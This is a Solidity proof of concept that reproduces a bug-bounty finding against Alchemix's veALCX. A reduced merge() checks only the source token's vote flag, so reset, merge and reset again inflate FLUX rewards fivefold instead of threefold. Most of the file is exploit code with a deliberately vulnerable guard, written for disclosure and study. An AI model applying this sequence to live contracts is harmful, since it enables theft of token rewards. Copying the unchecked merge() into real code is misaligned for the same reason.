// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    Alchemix — Attacker can gain infinite FLUX by repeating this attack!
    (Immunefi, Minato7namikazi, finding #38186)

    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    `VotingEscrow.merge`'s guard is inlined VERBATIM from VotingEscrow.sol#L619
    (audited commit f1007439ad3a32e412468c4c42f62f676822dc1f) — `merge(_from,
    _to)` only requires `!voted[_from]`, never checking `_to`. The Exploit
    deploys a reduced veALCX + Voter + FluxToken, resets 2 of 3 equal-balance
    positions (each accruing FLUX once, exactly as intended), merges BOTH into
    the 3rd (not-yet-reset) position, and then resets that 3rd position too —
    accruing FLUX AGAIN for balances that were already accrued via the first
    two resets (no fork, no cheatcodes, no time warp needed).

    Root cause: `Voter.reset(tokenId)` is capped to once per epoch per
    tokenId by `onlyNewEpoch(tokenId)`, and it calls `veALCX.abstain(tokenId)`
    (sets `voted[tokenId] = false`) before accruing FLUX proportional to the
    token's CURRENT balance. `VotingEscrow.merge(_from, _to)` only requires
    `!voted[_from]` — so an attacker can `reset()` id1 and id2 (each abstains
    and accrues once, exactly as intended), merge BOTH of their balances into
    id3 (permitted because voted[id1] and voted[id2] are now false — merge
    never checks voted[id3]), and then `reset(id3)` for the FIRST time this
    epoch. Because id3's balance grew via the merges, this reset accrues FLUX
    proportional to the COMBINED balance — double-counting id1 and id2's
    balances, which were already paid out via their own resets.
//////////////////////////////////////////////////////////////////////////*/

/// @notice Reduced veALCX: fixed balances per tokenId (the real contract
///         derives balance from locked amount + time-decay; irrelevant to
///         this bug, which is about `merge` combining balances mid-epoch),
///         plus the `voted` flag and `merge()` guard exactly as audited.
contract VotingEscrow {
    address public voter;
    address public admin;
    mapping(uint256 => uint256) public balanceOf;
    mapping(uint256 => bool) public voted;

    constructor() {
        admin = msg.sender;
    }

    // Reduction-only wiring helper (the real contract's `voter` is set via
    // admin-gated setVoter too -- irrelevant to this bug, just deploy order).
    function setVoter(address _voter) external {
        require(msg.sender == admin, "not admin");
        voter = _voter;
    }

    function setBalance(uint256 tokenId, uint256 amount) external {
        balanceOf[tokenId] = amount;
    }

    // Verbatim semantics from VotingEscrow.sol#L573-L582.
    function voting(uint256 tokenId) external {
        require(msg.sender == voter, "not voter");
        voted[tokenId] = true;
    }

    function abstain(uint256 tokenId) external {
        require(msg.sender == voter, "not voter");
        voted[tokenId] = false;
    }

    // Verbatim guard from VotingEscrow.sol#L618-L619 (rest of merge()'s
    // lock/cooldown/end-time checks are reduced away — they gate WHEN a
    // merge is allowed, not the missing-`_to`-check this bug is about).
    function merge(uint256 _from, uint256 _to) external {
        // @> VULN: only checks `voted[_from]` -- `_to` can be mid-vote (or,
        // as here, about to be reset) with no restriction at all.
        require(!voted[_from], "voting in progress for token");
        // FIX: also require(!voted[_to], "voting in progress for token");
        require(_from != _to, "must be different tokens");

        uint256 value = balanceOf[_from];
        balanceOf[_from] = 0;
        balanceOf[_to] += value;
    }
}

interface IVotingEscrowFlux {
    function balanceOf(uint256 tokenId) external view returns (uint256);
}

/// @notice Reduced FluxToken: accrueFlux is verbatim -- unconditionally
///         accrues the token's CURRENT claimable amount, with no memory of
///         "already accrued this epoch" (that responsibility belongs
///         entirely to Voter.reset()'s onlyNewEpoch guard).
contract FluxToken {
    address public voter;
    IVotingEscrowFlux public veALCX;
    mapping(uint256 => uint256) public unclaimedFlux;
    // Real ERC20-style balance, credited via claimFlux() -- mirrors
    // FluxToken.sol#L202-L212's claimFlux, minting into a plain balance map
    // instead of full ERC20 (the bug lives entirely in the double-accrual
    // mechanism, not in the ERC20 mechanics).
    mapping(address => uint256) public balanceOf;
    mapping(uint256 => address) public ownerOf;

    function setVoter(address _voter) external {
        voter = _voter;
    }

    function setVeALCX(address _ve) external {
        veALCX = IVotingEscrowFlux(_ve);
    }

    function setOwner(uint256 tokenId, address owner_) external {
        ownerOf[tokenId] = owner_;
    }

    // Verbatim from FluxToken.sol#L188-L192 (claimableFlux simplified to a
    // 1:1 ratio of current balance -- the real VotingEscrow.claimableFlux
    // is `balanceOfTokenAt(tokenId) * fluxPerVeALCX / BPS`, a fixed fraction
    // of current balance; the ratio itself is irrelevant to this bug).
    function accrueFlux(uint256 tokenId) external {
        require(msg.sender == voter, "not voter");
        uint256 amount = veALCX.balanceOf(tokenId);
        unclaimedFlux[tokenId] += amount;
    }

    // Verbatim shape from FluxToken.sol#L202-L212 (approval check omitted --
    // irrelevant scaffolding for this bug; the owner claims their own unclaimed balance).
    function claimFlux(uint256 tokenId, uint256 amount) external {
        require(unclaimedFlux[tokenId] >= amount, "amount greater than unclaimed balance");
        unclaimedFlux[tokenId] -= amount;
        balanceOf[ownerOf[tokenId]] += amount;
    }
}

/// @notice Reduced Voter: reset() is verbatim -- onlyNewEpoch per tokenId,
///         abstain() then accrueFlux() using the token's CURRENT balance.
contract Voter {
    VotingEscrow public veALCX;
    FluxToken public flux;
    mapping(uint256 => uint256) public lastVoted;
    uint256 internal constant DURATION = 2 weeks;

    constructor(VotingEscrow _ve, FluxToken _flux) {
        veALCX = _ve;
        flux = _flux;
    }

    modifier onlyNewEpoch(uint256 tokenId) {
        // Verbatim from Voter.sol#L105-L109.
        require((block.timestamp / DURATION) * DURATION > lastVoted[tokenId], "TOKEN_ALREADY_VOTED_THIS_EPOCH");
        _;
    }

    // Verbatim shape from Voter.sol#L182-L192 (reset() calling _reset then
    // abstain then accrueFlux -- pool-vote bookkeeping is irrelevant here).
    function reset(uint256 tokenId) external onlyNewEpoch(tokenId) {
        lastVoted[tokenId] = block.timestamp;
        veALCX.abstain(tokenId);
        flux.accrueFlux(tokenId);
    }
}

/// @notice Deploys the reduced system with 3 equal-balance positions (100k
///         each, matching the finding's own scenario), resets 2 of them
///         (each accrues once, as intended), merges both into the 3rd, then
///         resets the 3rd for the first time this epoch -- double-counting
///         the merged-in balances.
contract Exploit {
    VotingEscrow public veALCX;
    FluxToken public flux;
    Voter public voter;

    uint256 public constant ID1 = 1;
    uint256 public constant ID2 = 2;
    uint256 public constant ID3 = 3;
    uint256 public constant BAL = 100_000 ether;

    constructor() {
        flux = new FluxToken();
        veALCX = new VotingEscrow();
        voter = new Voter(veALCX, flux);

        // Wire the real caller relationships: Voter is the only address
        // allowed to call veALCX.voting()/abstain() and flux.accrueFlux().
        veALCX.setVoter(address(voter));
        flux.setVoter(address(voter));
        flux.setVeALCX(address(veALCX));

        veALCX.setBalance(ID1, BAL);
        veALCX.setBalance(ID2, BAL);
        veALCX.setBalance(ID3, BAL);

        flux.setOwner(ID1, address(this));
        flux.setOwner(ID2, address(this));
        flux.setOwner(ID3, address(this));
    }

    function run() external {
        // Each of id1 and id2 resets ONCE this epoch -- exactly the intended,
        // legitimate one-time accrual: unclaimedFlux[id] += 100k each.
        voter.reset(ID1);
        voter.reset(ID2);

        uint256 afterHonestResets = flux.unclaimedFlux(ID1) + flux.unclaimedFlux(ID2) + flux.unclaimedFlux(ID3);
        require(afterHonestResets == 2 * BAL, "setup: honest resets should accrue exactly 2x BAL");

        // id1 and id2 are now abstained (voted == false) by reset()'s
        // abstain() call -- merge()'s guard only checks the FROM token, so
        // both can be merged into id3, which has NOT been reset this epoch.
        veALCX.merge(ID1, ID3);
        veALCX.merge(ID2, ID3);
        require(veALCX.balanceOf(ID3) == 3 * BAL, "id3 should now hold all 3 positions' combined balance");

        // id3's FIRST reset this epoch -- allowed by onlyNewEpoch (its
        // lastVoted is still from before this epoch), and accrues FLUX
        // proportional to its NEW (merged, 3x) balance.
        voter.reset(ID3);

        uint256 totalAccrued = flux.unclaimedFlux(ID1) + flux.unclaimedFlux(ID2) + flux.unclaimedFlux(ID3);
        require(totalAccrued == 5 * BAL, "harm not demonstrated: merged balances must be double-counted");
        require(totalAccrued > 3 * BAL, "harm not demonstrated: total must exceed the honest one-reset-per-position total");

        // The attacker (owner of all 3 positions) claims every position's
        // unclaimed FLUX into a single real ERC20-style balance.
        flux.claimFlux(ID1, flux.unclaimedFlux(ID1));
        flux.claimFlux(ID2, flux.unclaimedFlux(ID2));
        flux.claimFlux(ID3, flux.unclaimedFlux(ID3));

        // HARM: the attacker's real FLUX balance is 5x BAL (500,000 units)
        // instead of the honest 3x BAL (300,000 units) a single reset per
        // original position should have produced -- the merged-in balances
        // (id1+id2 = 2x BAL) were double-counted.
        require(flux.balanceOf(address(this)) == 5 * BAL, "harm not demonstrated: claimed FLUX balance must be 5x BAL");
    }
}
